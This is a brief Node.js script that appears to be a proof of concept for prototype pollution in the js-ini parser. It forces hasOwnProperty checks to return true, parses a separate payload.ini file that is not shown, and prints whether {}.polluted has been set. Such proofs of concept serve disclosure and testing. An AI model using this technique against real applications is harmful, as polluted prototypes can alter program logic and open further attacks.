Object.prototype.hasOwnProperty.call = () => true;
const fs = require('fs');
const path = require('path');
const ini = require('js-ini');
obj = {};
console.log({}.polluted);
ini.parse(fs.readFileSync(path.resolve(__dirname, './payload.ini'), 'utf-8'));
console.log({}.polluted);